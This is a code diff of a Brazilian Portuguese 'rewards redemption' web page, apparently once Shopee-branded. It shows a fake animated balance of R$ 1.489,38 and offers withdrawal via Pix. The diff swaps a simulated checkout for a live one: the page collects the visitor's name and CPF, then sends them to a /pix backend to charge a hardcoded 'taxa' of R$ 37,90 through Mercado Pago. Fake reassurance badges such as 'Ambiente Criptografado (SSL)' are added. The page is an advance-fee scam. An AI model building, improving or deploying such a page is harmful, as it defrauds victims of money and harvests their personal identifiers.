@@ -2,313 +2,296 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Resgatar Recompensas</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Resgate Premium</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
     <style>
-        /* --- RESET E BASICO --- */
+        /* --- RESET E BASE PROFISSIONAL --- */
         * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
         body { 
             font-family: 'Roboto', sans-serif; 
-            background: #eef1f6; /* Fundo cinza claro */
+            background: #f4f7fa; /* Cinza azulado mais moderno */
             margin: 0; 
-            padding: 20px; 
-            color: #333; 
+            padding: 0; 
+            color: #2d3436; 
         }
         h1, h3, p { margin: 0; }
+        .container { padding: 20px 24px; max-width: 500px; margin: 0 auto; }
 
-        /* --- TÍTULO PRINCIPAL --- */
-        .main-title {
-            text-align: center;
-            font-size: 22px;
-            font-weight: 900;
-            margin-bottom: 20px;
-            color: #000;
-        }
-
-        /* --- PAINEL DE SALDO (LARANJA) --- */
+        /* --- CABEÇALHO PREMIUM --- */
         .header-section { 
-            background: linear-gradient(135deg, #f15a29 0%, #f78e57 100%);
-            padding: 25px;
+            /* Degradê mais sofisticado e profundo */
+            background: linear-gradient(145deg, #ff6b4a 0%, #ff472e 100%);
+            padding: 35px 25px;
             color: white; 
-            border-radius: 20px;
+            border-radius: 0 0 30px 30px; /* Arredondado apenas embaixo */
+            box-shadow: 0 15px 30px rgba(255, 71, 46, 0.25);
             position: relative;
-            margin-bottom: 15px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            overflow: hidden; /* Para a moeda não vazar */
+            overflow: hidden;
         }
-        .header-content { flex: 1; z-index: 2; }
-        .label-saldo { font-size: 16px; font-weight: 500; margin-bottom: 5px; }
-        .valor-grande { font-size: 42px; font-weight: 900; line-height: 1; }
-        .pontos-text { font-size: 14px; margin-top: 5px; opacity: 0.9; }
+        /* Efeito de luz sutil no fundo */
+        .header-section::before {
+            content: ''; position: absolute; top: -50%; left: -20%; width: 200%; height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 60%);
+            pointer-events: none;
+        }
+
+        .header-top-row { display: flex; justify-content: space-between; align-items: center; }
+        .label-saldo { font-size: 15px; font-weight: 400; opacity: 0.9; letter-spacing: 0.5px; }
         
-        /* Moeda corrigida e sem deformação */
-        .coin-container {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: #FFC107;
-            width: 80px;
-            height: 80px;
+        /* Valor Principal com Fonte de Impacto */
+        .valor-grande-container { display: flex; align-items: center; gap: 15px; margin-top: 10px; }
+        .valor-grande { font-size: 46px; font-weight: 900; letter-spacing: -1px; line-height: 1; }
+        .valor-grande span { font-variant-numeric: tabular-nums; } /* Evita pulos na animação */
+
+        /* --- MOEDA SOFISTICADA (CSS PURO - NÃO DEFORMA) --- */
+        .premium-coin {
+            width: 54px; height: 54px;
+            /* Degradê Dourado Rico */
+            background: linear-gradient(135deg, #FFD700 0%, #FF8C00 100%);
             border-radius: 50%;
-            border: 4px solid #FF9800;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
-            z-index: 1;
+            /* Efeito de borda brilhante e sombra */
+            box-shadow: inset 0 2px 3px rgba(255,255,255,0.5), inset 0 -2px 3px rgba(0,0,0,0.1), 0 8px 20px rgba(255, 140, 0, 0.3);
+            display: flex; align-items: center; justify-content: center;
+            position: relative;
         }
-        /* Ícone de cifrão dourado */
-        .coin-svg {
-            width: 40px;
-            height: 40px;
-        }
-
-
-        .bonus-bar {
-            background: #e85d30;
-            color: white;
-            text-align: center;
-            padding: 12px;
-            border-radius: 12px;
-            font-size: 14px;
-            font-weight: 500;
-            margin-bottom: 25px;
+        /* Símbolo $ Dourado */
+        .coin-symbol { font-size: 28px; font-weight: 900; color: #FFF; text-shadow: 0 1px 2px rgba(0,0,0,0.2); }
+        /* Brilho especular na moeda */
+        .premium-coin::after {
+            content: ''; position: absolute; top: 5px; left: 5px; width: 20px; height: 20px;
+            background: rgba(255,255,255,0.6); border-radius: 50%; filter: blur(4px); opacity: 0.7;
         }
 
-        /* --- CARTÕES BRANCOS --- */
+        .pontos-text { font-size: 13px; margin-top: 10px; opacity: 0.85; font-weight: 500; }
+
+        /* --- BARRA DE STATUS --- */
+        .status-bar {
+            background: white;
+            margin: -20px 24px 25px 24px; /* Sobe para cima do header */
+            padding: 15px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.06);
+            display: flex; align-items: center; gap: 12px;
+            position: relative; z-index: 10;
+            font-size: 14px; color: #555; font-weight: 500;
+        }
+        .status-icon { width: 24px; height: 24px; background: #e3fcef; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #00b894; }
+
+        /* --- CARTÕES PROFISSIONAIS --- */
         .card-white { 
             background: white; 
-            border-radius: 20px; 
-            padding: 25px; 
-            box-shadow: 0 4px 15px rgba(0,0,0,0.05); 
-            margin-bottom: 20px; 
+            border-radius: 24px; 
+            padding: 30px; 
+            /* Sombra suave e difusa (High-end) */
+            box-shadow: 0 12px 40px rgba(0,0,0,0.04); 
+            margin-bottom: 25px;
+            border: 1px solid rgba(0,0,0,0.03);
         }
-        h3.card-title { font-size: 18px; font-weight: 800; margin-bottom: 20px; color: #000; }
+        h3.card-title { font-size: 18px; font-weight: 800; margin-bottom: 22px; color: #2d3436; display: flex; align-items: center; gap: 10px; }
 
-        /* --- OPÇÕES DE SAQUE --- */
-        .transfer-info {
-            display: flex; align-items: center; gap: 10px;
-            font-size: 14px; color: #777; margin-bottom: 20px;
-        }
-        
-        /* Logo Pix corrigido com texto */
-        .pix-container {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-        .pix-logo { height: 24px; width: auto; }
-        .pix-text { font-weight: 700; color: #32BCAD; font-size: 16px; }
+        /* --- OPÇÕES DE SAQUE (CLEAN) --- */
+        .method-label { font-size: 14px; color: #888; margin-bottom: 18px; font-weight: 500; display: block; }
 
-
-        .options-grid { display: flex; gap: 10px; margin-bottom: 10px; }
+        .options-grid { display: flex; gap: 12px; margin-bottom: 12px; }
         .option-btn { 
             flex: 1; 
-            padding: 15px 0; 
-            background: #f1f2f6; 
-            border-radius: 12px; 
+            padding: 18px 0; 
+            background: white; 
+            border: 2px solid #edf2f7;
+            border-radius: 16px; 
             text-align: center; 
             font-weight: 700; 
-            color: #333;
+            color: #2d3436;
             font-size: 16px;
-            border: 2px solid transparent;
             cursor: pointer; 
-            transition: all 0.2s;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.02);
         }
         
         .big-option { 
             width: 100%; 
-            padding: 15px 0; 
-            background: #f1f2f6;
-            border-radius: 12px; 
+            padding: 22px 0; 
+            background: white;
+            border: 2px solid #edf2f7;
+            border-radius: 16px; 
             text-align: center; 
-            font-weight: 900;
-            font-size: 24px;
-            color: #333;
-            border: 2px solid transparent;
             cursor: pointer; 
-            margin-bottom: 20px;
-            transition: all 0.2s;
+            margin-bottom: 25px;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.02);
+            display: flex; flex-direction: column; align-items: center;
         }
+        .big-opt-val { font-size: 26px; font-weight: 900; color: #2d3436; }
+        .big-opt-sub { font-size: 12px; color: #00b894; font-weight: 700; text-transform: uppercase; margin-top: 5px; letter-spacing: 1px; }
 
-        /* ESTADO SELECIONADO */
+        /* ESTADO SELECIONADO (Elegante) */
         .selected { 
-            border-color: #2ecc71 !important; /* Verde Pix */
-            background: #e8f8f0 !important;
-            color: #2ecc71 !important;
+            border-color: #ff472e !important;
+            background: #fff5f3 !important;
+            color: #ff472e !important;
+            box-shadow: 0 8px 20px rgba(255, 71, 46, 0.15) !important;
+            transform: translateY(-2px);
         }
+        .big-option.selected .big-opt-val { color: #ff472e !important; }
 
-        /* --- BOTÃO SACAR --- */
-        .btn-sacar { 
+        /* --- BOTÃO DE AÇÃO --- */
+        .btn-main { 
             width: 100%; 
-            background: #e0e0e0; 
-            color: white; 
+            background: #dfe6e9; 
+            color: #b2bec3; 
             border: none; 
-            padding: 16px; 
-            border-radius: 30px; 
+            padding: 20px; 
+            border-radius: 16px; 
             font-size: 16px; 
-            font-weight: 700; 
+            font-weight: 800; 
             cursor: not-allowed; 
             text-align: center;
-            transition: all 0.3s;
+            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            letter-spacing: 0.5px;
         }
-        .btn-sacar.active { 
-            background: #2ecc71; /* Verde Pix */
+        .btn-main.active { 
+            /* Degradê no botão */
+            background: linear-gradient(to right, #ff6b4a, #ff472e); 
+            color: white;
             cursor: pointer; 
+            box-shadow: 0 10px 30px rgba(255, 71, 46, 0.3);
         }
-        .btn-sacar.active:hover { background: #27ae60; }
-        .legal-text { font-size: 11px; color: #999; text-align: center; margin-top: 15px; line-height: 1.4; }
+        .btn-main.active:active { transform: scale(0.98); }
 
-        /* --- CARTÃO DE ACESSO EXCLUSIVO --- */
-        .access-card { display: flex; justify-content: space-between; align-items: flex-start; }
-        .access-content { flex: 1; padding-right: 20px; }
-        .access-text { font-size: 12px; color: #666; line-height: 1.4; margin-top: 10px; }
-        .shopee-bag { width: 70px; height: auto; }
+        /* --- RODAPÉ DE SEGURANÇA --- */
+        .security-footer { text-align: center; margin-top: 30px; padding-bottom: 30px; }
+        .secure-badge { display: inline-flex; align-items: center; gap: 6px; font-size: 12px; color: #00b894; font-weight: 700; background: rgba(0, 184, 148, 0.1); padding: 6px 12px; border-radius: 20px; margin-bottom: 12px; }
+        .legal-text { font-size: 11px; color: #999; line-height: 1.6; max-width: 90%; margin: 0 auto; }
 
-        /* --- MODAIS (Mantidos do anterior) --- */
+        /* --- MODAIS --- */
         .hidden { display: none !important; }
-        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 100; display: flex; align-items: flex-end; }
-        .modal-sheet { background: white; width: 100%; border-radius: 25px 25px 0 0; padding: 35px 25px; animation: slideUp 0.3s; }
+        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.5); backdrop-filter: blur(5px); z-index: 100; display: flex; align-items: flex-end; }
+        .modal-sheet { background: white; width: 100%; border-radius: 30px 30px 0 0; padding: 40px 30px; animation: slideUp 0.35s cubic-bezier(0.25, 0.8, 0.25, 1); box-shadow: 0 -10px 40px rgba(0,0,0,0.1); }
         @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
-        input { width: 100%; padding: 16px; border: 1px solid #eee; background: #f9f9f9; border-radius: 10px; font-size: 16px; margin-top: 8px; margin-bottom: 15px; outline: none; }
-        label { font-size: 13px; font-weight: 700; color: #555; }
+        .input-group { margin-bottom: 20px; text-align: left; }
+        input { width: 100%; padding: 18px; border: 2px solid #edf2f7; background: #f9fbfc; border-radius: 14px; font-size: 16px; margin-top: 8px; outline: none; transition: 0.3s; font-weight: 500; color: #2d3436; }
+        input:focus { border-color: #ff472e; background: white; }
+        label { font-size: 13px; font-weight: 700; color: #636e72; text-transform: uppercase; letter-spacing: 0.5px; }
     </style>
 </head>
 <body>
 
-    <h1 class="main-title">Resgatar recompensas</h1>
-
     <div class="header-section">
-        <div class="header-content">
-            <div class="label-saldo">Seu saldo</div>
-            <div class="valor-grande">R$ <span id="counter">0,00</span></div> 
-            <div class="pontos-text">= <span id="points-counter">0</span> pontos (s)</div>
-        </div>
-        
-        <div class="coin-container">
-            <svg class="coin-svg" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M12 7V17M9 10H15M9 14H15" stroke="#F57F17" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
-                <path d="M12 7V17" stroke="#F57F17" stroke-width="2.5" stroke-linecap="round"/>
-                <circle cx="12" cy="12" r="9" stroke="#F57F17" stroke-width="2.5"/>
-            </svg>
+        <div class="header-top-row">
+            <div>
+                <div class="label-saldo">Saldo Total Disponível</div>
+                <div class="valor-grande-container">
+                    <div class="valor-grande">R$ <span id="counter">0,00</span></div>
+                    <div class="premium-coin">
+                        <span class="coin-symbol">$</span>
+                    </div>
+                </div>
+                <div class="pontos-text">+<span id="points-counter">0</span> pontos acumulados hoje</div>
+            </div>
         </div>
     </div>
 
-    <div class="bonus-bar">
-        Última bonificação apresentada: R$ 845,24
+    <div class="status-bar">
+        <div class="status-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
+        <span>Sua última bonificação de R$ 845,24 foi processada.</span>
     </div>
 
-    <div class="card-white">
-        <h3 class="card-title">Sacar dinheiro</h3>
-        
-        <div class="transfer-info">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#777" stroke-width="2"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg>
-            Transferência via / 
+    <div class="container">
+        <div class="card-white">
+            <h3 class="card-title">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#ff472e" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="16"/><line x1="8" y1="12" x2="16" y2="12"/></svg>
+                Solicitar Retirada
+            </h3>
             
-            <div class="pix-container">
-                <svg class="pix-logo" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M9.51029 8.09341L4.90858 3.50853C4.81068 3.41114 4.65191 3.41114 4.55401 3.50853L3.33122 4.7251C3.23331 4.82248 3.23331 4.98077 3.33122 5.07816L7.93293 9.66304C8.03084 9.76042 8.1896 9.76042 8.28751 9.66304L9.51029 8.44647C9.6082 8.34908 9.6082 8.1908 9.51029 8.09341Z" fill="#32BCAD"/>
-                    <path d="M11.1652 5.11731L12.4952 3.79266C12.5931 3.69498 12.7522 3.69498 12.8501 3.79266L17.4677 8.39258C17.5657 8.49025 17.5657 8.64873 17.4677 8.7464L16.1377 10.071C16.0397 10.1687 15.8806 10.1687 15.7827 10.071L11.1652 5.47113C11.0672 5.37345 11.0672 5.21498 11.1652 5.11731Z" fill="#32BCAD"/>
-                    <path d="M11.1841 8.40759L15.7859 12.9925C15.8838 13.0899 16.0425 13.0899 16.1404 12.9925L17.3632 11.7759C17.4611 11.6785 17.4611 11.5202 17.3632 11.4228L12.7615 6.83796C12.6636 6.74057 12.5049 6.74057 12.4069 6.83796L11.1841 8.05453C11.0862 8.15191 11.0862 8.3102 11.1841 8.40759Z" fill="#32BCAD"/>
-                    <path d="M9.49136 11.3842L8.16142 12.7088C8.06343 12.8065 7.90436 12.8065 7.80636 12.7088L3.18877 8.10893C3.09078 8.01125 3.09078 7.85277 3.18877 7.7551L4.51871 6.43045C4.6167 6.33277 4.77577 6.33277 4.87377 6.43045L9.49136 11.0303C9.58936 11.128 9.58936 11.2865 9.49136 11.3842Z" fill="#32BCAD"/>
-                    <path d="M8.11838 5.26287L6.14665 3.29931C5.79127 2.94536 5.21632 2.94536 4.86095 3.29931L1.38151 6.76427C1.02613 7.11821 1.02613 7.69073 1.38151 8.04468L3.35323 10.0082L8.11838 5.26287Z" fill="#32BCAD"/>
-                    <path d="M12.5618 11.2387L14.5335 13.2023C14.8889 13.5562 15.4638 13.5562 15.8192 13.2023L19.2987 9.73731C19.654 9.38337 19.654 8.81085 19.2987 8.4569L17.327 6.49334L12.5618 11.2387Z" fill="#32BCAD"/>
-                    <path d="M12.5236 6.45512L14.4954 4.49157C14.8507 4.13762 15.4257 4.13762 15.781 4.49157L19.2605 7.95653C19.6159 8.31048 19.6159 8.88299 19.2605 9.23695L17.2887 11.2005L12.5236 6.45512Z" fill="#32BCAD"/>
-                    <path d="M8.1565 10.0469L6.14665 12.0105C5.8294 12.3644 5.25445 12.3644 4.89907 12.0105L1.41963 8.54551C1.06426 8.19156 1.06426 7.61905 1.41963 7.26509L3.39136 5.30154L8.1565 10.0469Z" fill="#32BCAD"/>
-                </svg>
-                <span class="pix-text">pix</span>
+            <span class="method-label">Selecione o valor para transferência imediata:</span>
+
+            <div class="options-grid">
+                <div class="option-btn" onclick="selectItem(this, 1.5)">R$ 1,50</div>
+                <div class="option-btn" onclick="selectItem(this, 5.0)">R$ 5,00</div>
+                <div class="option-btn" onclick="selectItem(this, 10.0)">R$ 10,00</div>
             </div>
-        </div>
 
-        <div class="options-grid">
-            <div class="option-btn" onclick="selectItem(this, 1.5)">R$ 1,5</div>
-            <div class="option-btn" onclick="selectItem(this, 5.0)">R$ 5</div>
-            <div class="option-btn" onclick="selectItem(this, 10.0)">R$ 10</div>
-        </div>
-
-        <div id="big-opt" class="big-option" onclick="selectItem(this, 1489.38)">
-            R$ 1.489,38
-        </div>
-
-        <button id="btn-action" class="btn-sacar" onclick="openModal()">Sacar dinheiro</button>
-        
-        <p class="legal-text">
-            Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os limites de saque para transações individuais e mensais podem variar conforme o país ou região.
-        </p>
-    </div>
-
-    <div class="card-white">
-        <div class="access-card">
-            <div class="access-content">
-                <h3 class="card-title">Obtenha seu acesso exclusivo</h3>
-                <p class="access-text">Descubra todos os benefícios liberados especialmente para você. Ao concluir o acesso, você poderá aproveitar as vantagens disponíveis de forma rápida, segura e sem complicações. Não perca a oportunidade de garantir algo que é limitado e pensado para quem chegou até aqui.</p>
+            <div id="big-opt" class="big-option" onclick="selectItem(this, 1489.38)">
+                <span class="big-opt-val">R$ 1.489,38</span>
+                <span class="big-opt-sub">Saldo Remanescente</span>
             </div>
-            <svg class="shopee-bag" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M15 25H65V70C65 72.7614 62.7614 75 60 75H20C17.2386 75 15 72.7614 15 70V25Z" fill="#F15A29"/>
-                <path d="M25 25V15C25 12.2386 27.2386 10 30 10H50C52.7614 10 55 12.2386 55 15V25" stroke="#F15A29" stroke-width="5" stroke-linecap="round"/>
-                <path d="M30 40C30 45.5228 34.4772 50 40 50C45.5228 50 50 45.5228 50 40" stroke="white" stroke-width="4" stroke-linecap="round"/>
-            </svg>
+
+            <button id="btn-action" class="btn-main" onclick="openModal()">SELECIONE UM VALOR</button>
+        </div>
+
+        <div class="security-footer">
+            <div class="secure-badge">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                Ambiente Criptografado (SSL)
+            </div>
+            <p class="legal-text">
+                Transações processadas com segurança bancária. Os limites e prazos de compensação podem variar de acordo com a instituição financeira de destino.
+                <br><br>© 2026 Programa de Recompensas.
+            </p>
         </div>
     </div>
 
     <div id="modal-dados" class="modal-overlay hidden">
         <div class="modal-sheet">
-            <h2 style="text-align: center; margin-bottom: 25px; font-size: 18px;">Confirmar Saque</h2>
-            <label>Nome Completo</label>
-            <input type="text" id="input-nome" placeholder="Nome do titular">
-            <label>Chave Pix (CPF)</label>
-            <input type="tel" id="input-cpf" placeholder="000.000.000-00" maxlength="14" oninput="maskCPF(this)">
-            <button class="btn-sacar active" style="border-radius: 30px; margin-top: 10px;" onclick="goToCheckout()">CONTINUAR</button>
+            <h2 style="text-align: center; margin-bottom: 30px; font-size: 22px; font-weight: 800; color: #2d3436;">Dados de Recebimento</h2>
+            
+            <div class="input-group">
+                <label>Nome do Titular da Conta</label>
+                <input type="text" id="input-nome" placeholder="Ex: João da Silva" autocomplete="name">
+            </div>
+            
+            <div class="input-group">
+                <label>Chave CPF (Destino)</label>
+                <input type="tel" id="input-cpf" placeholder="000.000.000-00" maxlength="14" oninput="maskCPF(this)" autocomplete="off">
+            </div>
+
+            <button class="btn-main active" style="margin-top: 15px;" onclick="goToCheckout()">CONFIRMAR TRANSFERÊNCIA</button>
         </div>
     </div>
 
     <script>
-        // --- 1. FUNÇÃO DE ANIMAÇÃO DO CONTADOR (CORRIGIDA E OTIMIZADA) ---
+        // --- CONFIGURAÇÃO DA API (Render) ---
+        // Deixe vazio se o front e o back estiverem no mesmo lugar no Render
+        const API_BASE = ""; 
+
+        // --- 1. ANIMAÇÃO PROFISSIONAL DOS NÚMEROS ---
         function animateValue(id, start, end, duration) {
             const obj = document.getElementById(id);
-            // Proteção: se o elemento não existir, cancela
             if (!obj) return;
-
             let startTimestamp = null;
             const step = (timestamp) => {
                 if (!startTimestamp) startTimestamp = timestamp;
                 const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+                // Efeito de desaceleração (ease-out) para ficar mais elegante
+                const easeOutProgress = 1 - Math.pow(1 - progress, 3); 
+                let currentVal = easeOutProgress * (end - start) + start;
                 
-                // Calcula o valor atual baseado no progresso
-                let currentVal = progress * (end - start) + start;
-                
-                // Formata para moeda brasileira (BRL) se o ID for o do dinheiro
                 if (id === "counter") {
                     obj.innerHTML = currentVal.toLocaleString('pt-BR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
                 } else {
-                    // Formata para número inteiro se for pontos
                     obj.innerHTML = Math.floor(currentVal).toLocaleString('pt-BR');
                 }
                 
-                // Continua a animação se não tiver terminado
                 if (progress < 1) {
                     window.requestAnimationFrame(step);
                 } else {
-                    // Garante que o valor final seja o exato
-                    if (id === "counter") {
-                        obj.innerHTML = end.toLocaleString('pt-BR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
-                    } else {
-                        obj.innerHTML = end.toLocaleString('pt-BR');
-                    }
+                    if (id === "counter") obj.innerHTML = end.toLocaleString('pt-BR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+                    else obj.innerHTML = end.toLocaleString('pt-BR');
                 }
             };
             window.requestAnimationFrame(step);
         }
 
-        // --- 2. LÓGICA DE SELEÇÃO (MANTIDA) ---
+        // --- 2. SELEÇÃO INTELIGENTE ---
         let valorSelecionado = 0;
-
         function selectItem(element, valor) {
             document.querySelectorAll('.option-btn, .big-option').forEach(el => el.classList.remove('selected'));
             element.classList.add('selected');
             valorSelecionado = valor;
             const btn = document.getElementById('btn-action');
             btn.classList.add('active');
+            btn.innerText = "SACAR R$ " + valor.toLocaleString('pt-BR', {minimumFractionDigits: 2});
         }
 
         function openModal() {
@@ -325,23 +308,58 @@
             i.value = v;
         }
 
-        // --- 4. FUNÇÃO DE CHECKOUT (Simulação) ---
-        function goToCheckout() {
-            const nome = document.getElementById('input-nome').value;
+        // --- 4. CHECKOUT REAL (Integração com seu Backend) ---
+        async function goToCheckout() {
+            const nome = document.getElementById('input-nome').value.trim();
             const cpf = document.getElementById('input-cpf').value.replace(/\D/g, '');
-            if (nome.length < 3 || cpf.length < 11) return alert("Preencha corretamente.");
-            alert("Redirecionando para o pagamento da taxa...");
-            // Aqui você colocaria a lógica real de integração com seu backend
+
+            if (nome.length < 3 || cpf.length !== 11) {
+                alert("Por favor, preencha o nome completo e um CPF válido.");
+                return;
+            }
+
+            const btn = document.querySelector('#modal-dados .btn-main');
+            const textoOriginal = btn.innerText;
+            btn.innerText = "PROCESSANDO...";
+            btn.disabled = true;
+            btn.style.opacity = "0.7";
+
+            try {
+                // Chama seu backend no Render para gerar o Pix
+                const response = await fetch(`${API_BASE}/pix`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        amount: 37.90, // Valor da taxa
+                        name: nome,
+                        cpf: cpf,
+                        email: "cliente@email.com" // Pode capturar isso também se quiser
+                    })
+                });
+
+                const data = await response.json();
+
+                if (response.ok && data.point_of_interaction) {
+                    // SUCESSO! Redireciona para o link de pagamento do Mercado Pago
+                    window.location.href = data.point_of_interaction.transaction_data.ticket_url;
+                } else {
+                    throw new Error(data.message || "Erro ao gerar pagamento");
+                }
+
+            } catch (error) {
+                alert("Não foi possível iniciar a transação: " + error.message);
+                btn.innerText = textoOriginal;
+                btn.disabled = false;
+                btn.style.opacity = "1";
+            }
         }
 
-        // --- 5. INICIALIZAÇÃO SEGURA (DOMContentLoaded) ---
-        // Garante que o script só rode depois que o HTML carregou
+        // --- INICIALIZAÇÃO ---
         document.addEventListener("DOMContentLoaded", () => {
-            // Inicia a contagem de 0 até os valores finais em 2 segundos (2000ms)
-            animateValue("counter", 0, 1489.38, 2000);
-            animateValue("points-counter", 0, 42583, 2000);
+            // Inicia a animação suave dos números
+            animateValue("counter", 0, 1489.38, 2200);
+            animateValue("points-counter", 0, 42583, 2200);
         });
-
     </script>
 </body>
 </html>
